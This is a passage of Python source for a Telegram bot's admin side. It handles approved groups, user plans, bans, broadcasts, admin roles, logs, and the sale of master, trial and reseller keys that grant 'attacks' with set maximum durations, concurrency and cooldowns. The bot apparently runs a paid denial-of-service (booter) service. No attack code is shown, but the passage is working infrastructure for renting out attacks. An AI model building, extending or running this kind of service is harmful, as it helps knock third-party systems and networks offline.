        logger.error(f"Error in disapprove command: {e}")
        log_error(e, user_id=message.from_user.id, command="disapprove")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['approved_groups'])
def approved_groups(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        groups = list(groups_col.find())
        if not groups:
            bot.reply_to(message, "📋 No groups approved yet.")
            return
        
        text = "✅ <b>Approved Groups</b>\n\n"
        for i, group in enumerate(groups, 1):
            chat_id = group["_id"]
            limits = get_group_limits(int(chat_id))
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ ID: <code>{chat_id}</code>\n"
                f"├ Concurrent: {limits[0]}\n"
                f"├ Max Time: {limits[1]}s\n"
                f"├ Cooldown: {limits[2]}s\n"
                f"└ {'─' * 30}\n\n"
            )
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in approved_groups command: {e}")
        log_error(e, user_id=message.from_user.id, command="approved_groups")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= USER MANAGEMENT COMMANDS =================

# ================= USERS COMMAND =================
@bot.message_handler(commands=['users'])
def users_command(message):
    """List all users with active plans - Admin/Owner only"""
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        # Get all users with active plans
        users = list(plans_col.find({}))
        
        if not users:
            bot.reply_to(message, "📋 No users with active plans.")
            return
        
        # Get user count
        total_users = len(users)
        active_users = 0
        expired_users = 0
        
        for user in users:
            try:
                expires = datetime.fromisoformat(user.get("expires", ""))
                if expires > datetime.now():
                    active_users += 1
                else:
                    expired_users += 1
            except:
                expired_users += 1
        
        text = f"👥 <b>All Users</b>\n"
        text += f"╔════════════════════════╗\n"
        text += f"║   👥 USER LIST        ║\n"
        text += f"╚════════════════════════╝\n\n"
        text += f"📊 <b>Total Users:</b> {total_users}\n"
        text += f"✅ <b>Active:</b> {active_users}\n"
        text += f"⏰ <b>Expired:</b> {expired_users}\n\n"
        
        # List users
        for i, user in enumerate(users[:50], 1):  # Show first 50 users
            user_id = user.get("_id", "Unknown")
            expires = user.get("expires", "Unknown")
            plan_type = user.get("plan_type", "standard")
            
            # Format expiry
            try:
                if expires != "Unknown":
                    dt = datetime.fromisoformat(expires)
                    if dt > datetime.now():
                        status = "✅ Active"
                    else:
                        status = "⏰ Expired"
                    expires = dt.strftime("%Y-%m-%d")
                else:
                    status = "❓ Unknown"
            except:
                status = "❓ Unknown"
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ ID: <code>{user_id}</code>\n"
                f"├ Status: {status}\n"
                f"├ Type: {plan_type}\n"
                f"├ Expires: {expires}\n"
                f"└ {'─' * 30}\n\n"
            )
        
        if len(users) > 50:
            text += f"\n⚠️ Showing first 50 users. Total: {total_users}\n"
            text += f"💡 Use /get_user_info &lt;id&gt; for specific user details."
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in users command: {e}")
        log_error(e, user_id=message.from_user.id, command="users")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= GET USER INFO COMMAND =================
@bot.message_handler(commands=['get_user_info'])
def get_user_info(message):
    """Get detailed information about a user - Admin/Owner only"""
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /get_user_info &lt;user_id&gt;\n\n"
                        "Example: /get_user_info 123456789")
            return
        
        try:
            user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        # Get user plan
        plan = plans_col.find_one({"_id": str(user_id)})
        
        # Check if user is banned
        is_banned_user = is_banned(user_id)
        
        # Check if user is admin or owner
        is_admin_user = is_admin(user_id)
        is_owner_user = is_owner(user_id)
        is_reseller_user = is_reseller(user_id)
        
        # Get user info from known_users
        known = known_users_col.find_one({"_id": str(user_id)})
        
        text = f"👤 <b>User Information</b>\n"
        text += f"╔════════════════════════╗\n"
        text += f"║   👤 USER DETAILS     ║\n"
        text += f"╚════════════════════════╝\n\n"
        
        text += f"🆔 <b>User ID:</b> <code>{user_id}</code>\n"
        text += f"👑 <b>Owner:</b> {'✅ Yes' if is_owner_user else '❌ No'}\n"
        text += f"👮 <b>Admin:</b> {'✅ Yes' if is_admin_user else '❌ No'}\n"
        text += f"💰 <b>Reseller:</b> {'✅ Yes' if is_reseller_user else '❌ No'}\n"
        text += f"🚫 <b>Banned:</b> {'✅ Yes' if is_banned_user else '❌ No'}\n\n"
        
        if known:
            last_seen = known.get("last_seen", "Unknown")
            try:
                if last_seen != "Unknown":
                    dt = datetime.fromisoformat(last_seen)
                    last_seen = dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                pass
            text += f"📅 <b>Last Seen:</b> {last_seen}\n"
        
        if plan:
            expires = plan.get("expires", "Unknown")
            max_duration = plan.get("max_duration", "Unknown")
            cooldown = plan.get("cooldown", "Unknown")
            plan_type = plan.get("plan_type", "standard")
            redeemed_code = plan.get("redeemed_code", "Unknown")
            redeemed_at = plan.get("redeemed_at", "Unknown")
            
            try:
                if expires != "Unknown":
                    dt = datetime.fromisoformat(expires)
                    if dt > datetime.now():
                        status = "✅ Active"
                        remaining = dt - datetime.now()
                        text += f"\n⏰ <b>Time Remaining:</b> {remaining.days}d {remaining.seconds//3600}h"
                    else:
                        status = "⏰ Expired"
                else:
                    status = "❓ Unknown"
            except:
                status = "❓ Unknown"
            
            text += f"\n━━━━━━━ <b>PLAN DETAILS</b> ━━━━━━━\n"
            text += f"📊 <b>Status:</b> {status}\n"
            text += f"📝 <b>Type:</b> {plan_type}\n"
            text += f"⏱ <b>Max Duration:</b> {max_duration}s\n"
            text += f"⏳ <b>Cooldown:</b> {cooldown}s\n"
            text += f"📅 <b>Expires:</b> {expires[:10] if expires != 'Unknown' else 'Unknown'}\n"
            text += f"🔑 <b>Redeemed Code:</b> <code>{redeemed_code}</code>\n"
            text += f"🕒 <b>Redeemed At:</b> {redeemed_at[:16] if redeemed_at != 'Unknown' else 'Unknown'}\n"
        else:
            text += f"\n❌ <b>No active plan found for this user.</b>\n"
        
        # Check if user has pending feedback
        if has_pending_feedback(user_id):
            text += f"\n📸 <b>Pending Feedback:</b> Yes - User needs to submit screenshot"
        
        # Get user attack stats
        total_attacks = attack_logs_col.count_documents({"user_id": user_id})
        completed_attacks = attack_logs_col.count_documents({"user_id": user_id, "status": "completed"})
        failed_attacks = attack_logs_col.count_documents({"user_id": user_id, "status": "failed"})
        
        text += f"\n\n━━━━━━━ <b>ATTACK STATS</b> ━━━━━━━\n"
        text += f"🎯 <b>Total Attacks:</b> {total_attacks}\n"
        text += f"✅ <b>Completed:</b> {completed_attacks}\n"
        text += f"❌ <b>Failed:</b> {failed_attacks}\n"
        
        if is_reseller_user:
            reseller = resellers_col.find_one({"_id": str(user_id)})
            if reseller:
                credits = reseller.get("credits", 0)
                text += f"\n━━━━━━━ <b>RESELLER INFO</b> ━━━━━━━\n"
                text += f"💳 <b>Credits:</b> {credits}\n"
                text += f"🔑 <b>Keys Generated:</b> {keys_col.count_documents({'created_by': user_id})}\n"
        
        bot.reply_to(message, text)
        
    except Exception as e:
        logger.error(f"Error in get_user_info command: {e}")
        log_error(e, user_id=message.from_user.id, command="get_user_info")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= REMOVE USER COMMAND =================
@bot.message_handler(commands=['remove'])
def remove_user(message):
    """Remove a user's plan - Admin/Owner only"""
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can remove users.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /remove &lt;user_id&gt;\n\n"
                        "Example: /remove 123456789\n\n"
                        "This will remove the user's plan and all associated data.")
            return
        
        try:
            user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if is_owner(user_id):
            bot.reply_to(message, "❌ Cannot remove the owner.")
            return
        
        # Check if user has a plan
        plan = plans_col.find_one({"_id": str(user_id)})
        if not plan:
            bot.reply_to(message, f"⚠️ User {user_id} does not have an active plan.")
            return
        
        # Get the redeemed code if any
        redeemed_code = plan.get("redeemed_code")
        
        # Remove user plan
        plans_col.delete_one({"_id": str(user_id)})
        
        # If there's a redeemed code, mark it as not redeemed
        if redeemed_code:
            keys_col.update_one(
                {"_id": redeemed_code},
                {"$set": {"redeemed_by": None, "redeemed_at": None}}
            )
        
        # Clear pending feedback
        clear_pending_feedback(user_id)
        
        # Log action
        log_admin_action(message.from_user.id, "remove_user", f"Removed user {user_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>User Removed</b>\n\n"
                    f"👤 User ID: <code>{user_id}</code>\n"
                    f"🔑 Redeemed Code: <code>{redeemed_code or 'None'}</code>\n"
                    f"🕒 Removed by: {message.from_user.id}\n"
                    f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                    f"💡 The user's plan has been removed.\n"
                    f"🔑 The redeemed key has been released.")
        
        # Notify user
        try:
            bot.send_message(user_id, 
                           f"⚠️ <b>Your Plan Has Been Removed</b>\n\n"
                           f"Your access to the bot has been removed by an admin.\n"
                           f"Contact the admin for more information.\n\n"
                           f"💡 If you have a key, you can redeem it again.")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in remove command: {e}")
        log_error(e, user_id=message.from_user.id, command="remove")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= REMOVE EXPIRED COMMAND =================
@bot.message_handler(commands=['remove_expired'])
def remove_expired(message):
    """Remove all expired plans - Admin/Owner only"""
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        # Find expired plans
        expired = list(plans_col.find({"expires": {"$lt": datetime.now().isoformat()}}))
        
        if not expired:
            bot.reply_to(message, "📋 No expired plans found.")
            return
        
        count = 0
        for user in expired:
            user_id = user.get("_id")
            redeemed_code = user.get("redeemed_code")
            
            # Remove plan
            plans_col.delete_one({"_id": user_id})
            
            # Release key if any
            if redeemed_code:
                keys_col.update_one(
                    {"_id": redeemed_code},
                    {"$set": {"redeemed_by": None, "redeemed_at": None}}
                )
            
            count += 1
        
        log_admin_action(message.from_user.id, "remove_expired", f"Removed {count} expired plans")
        
        bot.reply_to(message, 
                    f"✅ <b>Expired Plans Removed</b>\n\n"
                    f"🗑 Removed: {count} expired plans\n"
                    f"🔑 Released: {count} keys\n\n"
                    f"✅ All expired users have been cleaned up.")
        
    except Exception as e:
        logger.error(f"Error in remove_expired command: {e}")
        log_error(e, user_id=message.from_user.id, command="remove_expired")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= DELETE CODE COMMAND (FIXED) =================
@bot.message_handler(commands=['delete_code'])
def delete_code_command(message):
    """Delete a specific code - Admin/Owner only"""
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /delete_code &lt;code&gt;\n\n"
                        "Example: /delete_code VIP-ABC123DEF456")
            return
        
        code = parts[1].upper()
        
        # Check if code exists
        key = keys_col.find_one({"_id": code})
        if not key:
            bot.reply_to(message, f"❌ Code <code>{code}</code> not found.")
            return
        
        # Check if code is already redeemed
        if key.get("redeemed_by"):
            # Get user who redeemed it
            redeemed_by = key.get("redeemed_by")
            
            # Remove user's plan
            plans_col.delete_one({"_id": str(redeemed_by)})
            
            # Clear pending feedback
            clear_pending_feedback(redeemed_by)
            
            # Delete the key
            keys_col.delete_one({"_id": code})
            
            log_admin_action(message.from_user.id, "delete_code", f"Deleted redeemed code {code} from user {redeemed_by}")
            
            bot.reply_to(message, 
                        f"✅ <b>Code Deleted Successfully</b>\n\n"
                        f"📋 Code: <code>{code}</code>\n"
                        f"👤 Redeemed by: <code>{redeemed_by}</code>\n"
                        f"🕒 Deleted by: {message.from_user.id}\n"
                        f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"✅ The key has been deleted and the user's plan has been removed.")
            
            # Notify user
            try:
                bot.send_message(redeemed_by, 
                               f"⚠️ <b>Your Plan Has Been Removed</b>\n\n"
                               f"The code <code>{code}</code> you redeemed has been deleted by an admin.\n"
                               f"Your access has been removed.\n"
                               f"Contact the admin for more information.")
            except:
                pass
            
        else:
            # Code is not redeemed, just delete it
            keys_col.delete_one({"_id": code})
            
            # Also remove from blocked codes if present
            blocked_codes_col.delete_one({"_id": code})
            
            log_admin_action(message.from_user.id, "delete_code", f"Deleted unredeemed code {code}")
            
            bot.reply_to(message, 
                        f"✅ <b>Code Deleted</b>\n\n"
                        f"📋 Code: <code>{code}</code>\n"
                        f"🕒 Deleted by: {message.from_user.id}\n"
                        f"📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                        f"✅ The code has been permanently deleted.")
        
    except Exception as e:
        logger.error(f"Error in delete_code command: {e}")
        log_error(e, user_id=message.from_user.id, command="delete_code")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= BAN USER COMMAND =================
@bot.message_handler(commands=['ban'])
def ban_user(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can ban users.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /ban &lt;user_id&gt;")
            return
        
        try:
            user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if user_id == BOT_OWNER:
            bot.reply_to(message, "❌ Cannot ban the bot owner.")
            return
        
        if is_owner(user_id):
            bot.reply_to(message, "❌ Cannot ban the bot owner.")
            return
        
        if is_admin(user_id) and not is_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only the owner can ban admins.")
            return
        
        if is_banned(user_id):
            bot.reply_to(message, f"⚠️ User {user_id} is already banned.")
            return
        
        bans_col.insert_one({"_id": str(user_id), "banned_by": message.from_user.id, "banned_at": datetime.now().isoformat()})
        log_admin_action(message.from_user.id, "ban_user", f"Banned user {user_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>User Banned</b>\n\n"
                    f"User ID: <code>{user_id}</code>\n"
                    f"Banned by: {message.from_user.id}")
        
        try:
            bot.send_message(user_id, 
                           f"🚫 <b>You Have Been Banned</b>\n\n"
                           f"You are no longer allowed to use this bot.\n"
                           f"Contact the bot owner to appeal.")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in ban command: {e}")
        log_error(e, user_id=message.from_user.id, command="ban")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= UNBAN USER COMMAND =================
@bot.message_handler(commands=['unban'])
def unban_user(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can unban users.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /unban &lt;user_id&gt;")
            return
        
        try:
            user_id = int(parts[1])
        except ValueError:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if not is_banned(user_id):
            bot.reply_to(message, f"⚠️ User {user_id} is not banned.")
            return
        
        bans_col.delete_one({"_id": str(user_id)})
        log_admin_action(message.from_user.id, "unban_user", f"Unbanned user {user_id}")
        
        bot.reply_to(message, 
                    f"✅ <b>User Unbanned</b>\n\n"
                    f"User ID: <code>{user_id}</code>\n"
                    f"Unbanned by: {message.from_user.id}")
        
        try:
            bot.send_message(user_id, 
                           f"✅ <b>You Have Been Unbanned</b>\n\n"
                           f"You can now use the bot again.")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in unban command: {e}")
        log_error(e, user_id=message.from_user.id, command="unban")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= BANNED LIST COMMAND =================
@bot.message_handler(commands=['banned_list'])
def banned_list(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        banned = list(bans_col.find())
        if not banned:
            bot.reply_to(message, "📋 No banned users.")
            return
        
        text = "🚫 <b>Banned Users</b>\n\n"
        for i, user in enumerate(banned, 1):
            uid = user["_id"]
            banned_by = user.get("banned_by", "Unknown")
            banned_at = user.get("banned_at", "Unknown")
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ ID: <code>{uid}</code>\n"
                f"├ Banned by: {banned_by}\n"
                f"└ {'─' * 30}\n\n"
            )
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in banned_list command: {e}")
        log_error(e, user_id=message.from_user.id, command="banned_list")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= BROADCAST COMMAND =================
@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can broadcast messages.")
            return
        
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, "⚠️ <b>Usage:</b> /broadcast &lt;message&gt;\n\n"
                        "Example: /broadcast Hello everyone!\n\n"
                        "📋 Options:\n"
                        "• /broadcast all &lt;msg&gt; - Send to all users\n"
                        "• /broadcast users &lt;msg&gt; - Send to active users\n"
                        "• /broadcast resellers &lt;msg&gt; - Send to resellers\n"
                        "• /broadcast admins &lt;msg&gt; - Send to admins")
            return
        
        broadcast_parts = parts[1].split(maxsplit=1)
        target = "all"
        msg = parts[1]
        
        if len(broadcast_parts) == 2 and broadcast_parts[0] in ['all', 'users', 'resellers', 'admins']:
            target = broadcast_parts[0]
            msg = broadcast_parts[1]
        elif len(broadcast_parts) == 1:
            msg = broadcast_parts[0]
        
        users = []
        if target == 'all' or target == 'users':
            user_plans = plans_col.find({})
            for plan in user_plans:
                try:
                    users.append(int(plan["_id"]))
                except:
                    pass
            
            known = known_users_col.find({})
            for user in known:
                try:
                    uid = int(user["_id"])
                    if uid not in users:
                        users.append(uid)
                except:
                    pass
        
        if target == 'resellers':
            resellers = resellers_col.find({})
            for reseller in resellers:
                try:
                    users.append(int(reseller["_id"]))
                except:
                    pass
        
        if target == 'admins':
            admins = admins_col.find({})
            for admin in admins:
                try:
                    users.append(int(admin["_id"]))
                except:
                    pass
            users.append(BOT_OWNER)
        
        if target == 'all':
            if BOT_OWNER not in users:
                users.append(BOT_OWNER)
        
        if not users:
            bot.reply_to(message, "⚠️ No users found to broadcast to.")
            return
        
        broadcast_msg = (
            f"📢 <b>Broadcast Message</b>\n"
            f"╔════════════════════════╗\n"
            f"║   📢 ADMIN NOTICE     ║\n"
            f"╚════════════════════════╝\n\n"
            f"{msg}\n\n"
            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        success_count = 0
        fail_count = 0
        
        status_msg = bot.reply_to(message, f"📤 <b>Sending broadcast...</b>\n\nTarget: {target}\nUsers: {len(users)}")
        
        for uid in users:
            try:
                bot.send_message(uid, broadcast_msg)
                success_count += 1
                time.sleep(0.05)
            except Exception as e:
                fail_count += 1
                logger.error(f"Failed to send broadcast to {uid}: {e}")
            
            if (success_count + fail_count) % 10 == 0:
                try:
                    bot.edit_message_text(
                        f"📤 <b>Sending broadcast...</b>\n\n"
                        f"Target: {target}\n"
                        f"Sent: {success_count}/{len(users)}\n"
                        f"Failed: {fail_count}",
                        chat_id=message.chat.id,
                        message_id=status_msg.message_id
                    )
                except:
                    pass
        
        log_admin_action(message.from_user.id, "broadcast", f"Broadcast to {target}: {success_count} sent, {fail_count} failed")
        
        bot.edit_message_text(
            f"✅ <b>Broadcast Complete!</b>\n\n"
            f"📋 Target: {target}\n"
            f"✅ Sent: {success_count}\n"
            f"❌ Failed: {fail_count}\n"
            f"📝 Message: {msg[:100]}{'...' if len(msg) > 100 else ''}",
            chat_id=message.chat.id,
            message_id=status_msg.message_id
        )
        
    except Exception as e:
        logger.error(f"Error in broadcast command: {e}")
        log_error(e, user_id=message.from_user.id, command="broadcast")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= ADMIN COMMANDS =================
@bot.message_handler(commands=['addadmin'])
def add_admin(message):
    try:
        if not is_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only the bot owner can add admins.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /addadmin &lt;user_id&gt;")
            return
        
        try:
            uid = int(parts[1])
        except:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if uid == BOT_OWNER:
            bot.reply_to(message, "❌ That's the owner ID.")
            return
        
        if is_admin(uid):
            bot.reply_to(message, f"⚠️ User {uid} is already an admin.")
            return
        
        admins_col.insert_one({"_id": str(uid), "added_by": message.from_user.id, "added_at": datetime.now().isoformat()})
        log_admin_action(message.from_user.id, "add_admin", f"Added admin {uid}")
        
        bot.reply_to(message, 
                    f"✅ <b>Admin Added</b>\n\n"
                    f"User ID: <code>{uid}</code>\n"
                    f"Added by: Owner\n"
                    f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        try:
            bot.send_message(uid, 
                           f"👮 <b>You're Now an Admin!</b>\n\n"
                           f"You've been granted admin access to the bot.\n"
                           f"Use /owner to see admin commands.\n"
                           f"Use /help for all commands.")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in addadmin command: {e}")
        log_error(e, user_id=message.from_user.id, command="addadmin")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['removeadmin'])
def remove_admin(message):
    try:
        if not is_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only the bot owner can remove admins.")
            return
        
        parts = message.text.split()
        if len(parts) != 2:
            bot.reply_to(message, "⚠️ Usage: /removeadmin &lt;user_id&gt;")
            return
        
        try:
            uid = int(parts[1])
        except:
            bot.reply_to(message, "❌ Invalid user ID.")
            return
        
        if not is_admin(uid):
            bot.reply_to(message, f"⚠️ User {uid} is not an admin.")
            return
        
        admins_col.delete_one({"_id": str(uid)})
        log_admin_action(message.from_user.id, "remove_admin", f"Removed admin {uid}")
        
        bot.reply_to(message, 
                    f"✅ <b>Admin Removed</b>\n\n"
                    f"User ID: <code>{uid}</code>\n"
                    f"Removed by: Owner")
        
        try:
            bot.send_message(uid, "⚠️ Your admin access has been revoked.")
        except:
            pass
        
    except Exception as e:
        logger.error(f"Error in removeadmin command: {e}")
        log_error(e, user_id=message.from_user.id, command="removeadmin")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

@bot.message_handler(commands=['admins'])
def list_admins(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        admins = list(admins_col.find())
        if not admins:
            bot.reply_to(message, "📋 No admins configured.")
            return
        
        text = "👥 <b>Bot Admins</b>\n\n"
        for i, admin in enumerate(admins, 1):
            uid = admin["_id"]
            added_by = admin.get("added_by", "Unknown")
            added_at = admin.get("added_at", "Unknown")
            
            try:
                user = bot.get_chat(int(uid))
                username = f"@{user.username}" if user.username else "No username"
                name = html.escape(user.first_name or "")
            except:
                username = "Unknown"
                name = ""
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ ID: <code>{uid}</code>\n"
                f"├ Username: {username}\n"
                f"├ Name: {name}\n"
                f"├ Added by: {added_by}\n"
                f"└ {'─' * 30}\n\n"
            )
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in admins command: {e}")
        log_error(e, user_id=message.from_user.id, command="admins")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= ADMIN LOGS COMMAND =================
@bot.message_handler(commands=['adminlogs'])
def admin_logs_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can view this.")
            return
        
        parts = message.text.split()
        limit = 10
        
        if len(parts) > 1:
            try:
                limit = int(parts[1])
                if limit > 50:
                    limit = 50
            except ValueError:
                bot.reply_to(message, "❌ Invalid number. Please provide a valid number.")
                return
        
        logs = list(admin_logs_col.find().sort("timestamp", -1).limit(limit))
        
        if not logs:
            bot.reply_to(message, "📋 No admin logs found.")
            return
        
        text = "📋 <b>Recent Admin Logs</b>\n\n"
        
        for i, log in enumerate(logs, 1):
            timestamp = log.get("timestamp", "Unknown")
            admin_id = log.get("admin_id", "Unknown")
            action = log.get("action", "Unknown")
            details = log.get("details", "")
            
            try:
                dt = datetime.fromisoformat(timestamp)
                timestamp = dt.strftime("%Y-%m-%d %H:%M:%S")
            except:
                pass
            
            text += (
                f"<b>#{i}</b>\n"
                f"├ 🕒 {timestamp}\n"
                f"├ 👤 Admin: <code>{admin_id}</code>\n"
                f"├ 📝 Action: {action}\n"
            )
            
            if details:
                text += f"├ 📋 Details: {details[:100]}{'...' if len(details) > 100 else ''}\n"
            
            text += f"└ {'─' * 30}\n\n"
        
        bot.reply_to(message, text[:4000])
        
    except Exception as e:
        logger.error(f"Error in adminlogs command: {e}")
        log_error(e, user_id=message.from_user.id, command="adminlogs")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= GENKEY COMMAND =================
@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, 
                        "⚠️ <b>Usage:</b> /genkey &lt;duration&gt; &lt;cooldown&gt; &lt;days&gt;\n\n"
                        "Example: /genkey 300 60 7\n\n"
                        "📋 <b>Parameters:</b>\n"
                        "• duration: Max attack duration in seconds (30-400)\n"
                        "• cooldown: Cooldown in seconds (10-300)\n"
                        "• days: Validity in days (1-30)")
            return
        
        try:
            duration = int(parts[1])
            cooldown = int(parts[2])
            days = int(parts[3])
        except ValueError:
            bot.reply_to(message, "❌ All parameters must be numbers.")
            return
        
        if duration < 30 or duration > 400:
            bot.reply_to(message, "❌ Duration must be between 30 and 400 seconds.")
            return
        
        if cooldown < 10 or cooldown > 300:
            bot.reply_to(message, "❌ Cooldown must be between 10 and 300 seconds.")
            return
        
        if days < 1 or days > 30:
            bot.reply_to(message, "❌ Days must be between 1 and 30.")
            return
        
        expires = datetime.now() + timedelta(days=days)
        code = generate_code("MASTER", 12)
        
        keys_col.insert_one({
            "_id": code,
            "type": "master",
            "attacks_left": -1,
            "max_duration": duration,
            "cooldown": cooldown,
            "expires": expires.isoformat(),
            "created_by": message.from_user.id,
            "redeemed_by": None,
            "redeemed_at": None,
            "trial": False,
            "created_at": datetime.now().isoformat(),
            "duration_days": days,
            "prefix": "MASTER"
        })
        
        log_admin_action(message.from_user.id, "genkey", f"Generated master key: {code}")
        log_key_event("generated_master", code, created_by=message.from_user.id, extra=f"duration={duration}, cooldown={cooldown}, days={days}")
        
        bot.reply_to(message, 
                    f"✅ <b>Master Key Generated</b>\n\n"
                    f"🔑 <b>Key:</b> <code>{code}</code>\n"
                    f"⏱ <b>Max Duration:</b> {duration}s\n"
                    f"⏳ <b>Cooldown:</b> {cooldown}s\n"
                    f"📅 <b>Expires:</b> {format_expiry(expires)}\n"
                    f"📏 <b>Validity:</b> {days} days\n"
                    f"🎯 <b>Attacks:</b> Unlimited\n\n"
                    f"💡 Users can redeem with: /redeem {code}")
        
    except Exception as e:
        logger.error(f"Error in genkey command: {e}")
        log_error(e, user_id=message.from_user.id, command="genkey")
        bot.reply_to(message, "❌ An error occurred. Please try again.")

# ================= GENTRIAL COMMAND =================
@bot.message_handler(commands=['gentrial'])
def gentrial_command(message):
    try:
        if not is_admin_or_owner(message.from_user.id):
            bot.reply_to(message, "❌ Only admins or owner can use this command.")
            return
        
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, 
                        "⚠️ <b>Usage:</b> /gentrial &lt;hours&gt; &lt;count&gt;\n\n"
                        "Example: /gentrial 24 5\n\n"
                        "📋 <b>Parameters:</b>\n"
                        "• hours: Validity in hours (1-72)\n"
                        "• count: Number of keys (1-50)")
            return
        
        try:
            hours = int(parts[1])
            count = int(parts[2])
        except ValueError:
            bot.reply_to(message, "❌ Hours and count must be numbers.")
            return
        
        if hours < 1 or hours > 72:
            bot.reply_to(message, "❌ Hours must be between 1 and 72.")
            return
        
        if count < 1 or count > 50:
            bot.reply_to(message, "❌ Count must be between 1 and 50.")
            return
        
        expires = datetime.now() + timedelta(hours=hours)
        codes = []
        
        for i in range(count):
            code = generate_code("TRIAL", 10)
            keys_col.insert_one({
                "_id": code,
                "type": "trial",
                "attacks_left": 3,
                "max_duration": 120,
                "cooldown": 60,
                "expires": expires.isoformat(),
                "created_by": message.from_user.id,
                "redeemed_by": None,
                "redeemed_at": None,
                "trial": True,
                "created_at": datetime.now().isoformat(),
                "duration_hours": hours,
                "prefix": "TRIAL"
            })
            codes.append(code)
            log_key_event("generated_trial", code, created_by=message.from_user.id, extra=f"hours={hours}")
        
        code_list = "\n".join([f"<code>{code}</code>" for code in codes])
        
        log_admin_action(message.from_user.id, "gentrial", f"Generated {count} trial keys for {hours} hours")
        
        bot.reply_to(message, 
                    f"✅ <b>Trial Keys Generated</b>\n\n"
                    f"📏 <b>Count:</b> {count}\n"
                    f"⏳ <b>Validity:</b> {hours} hours\n"
                    f"📅 <b>Expires:</b> {format_expiry(expires)}\n"
                    f"🎯 <b>Attacks per key:</b> 3 (Limited)\n"
                    f"⏱ <b>Max Duration:</b> 120s\n"
                    f"⏳ <b>Cooldown:</b> 60s\n\n"
                    f"━━━━━━━ <b>KEYS</b> ━━━━━━━\n"
                    f"{code_list}\n\n"
                    f"💡 Users redeem with: /redeem CODE")
